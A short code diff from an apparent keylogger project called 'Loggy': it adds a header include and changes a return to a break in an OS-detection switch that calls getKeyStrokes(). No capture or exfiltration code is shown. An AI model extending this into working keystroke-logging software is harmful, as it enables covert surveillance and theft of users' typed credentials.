@@ -1,4 +1,5 @@
 #include "include/core.h"
+#include "include/externals.h"
 
 #ifdef _WIN32
 Loggy::Types::OPERATING_SYSTEM operatingSystem = Loggy::Types::OPERATING_SYSTEM::WINDOWS;
@@ -17,7 +18,7 @@ int main() {
         case Loggy::Types::OPERATING_SYSTEM::WINDOWS:
             printf("Operating System: Windows\n");
             getKeyStrokes();
-            return 1;
+            break;
         case Loggy::Types::OPERATING_SYSTEM::MAC:
             printf("Operating System: MacOS\n");
             getKeyStrokes();
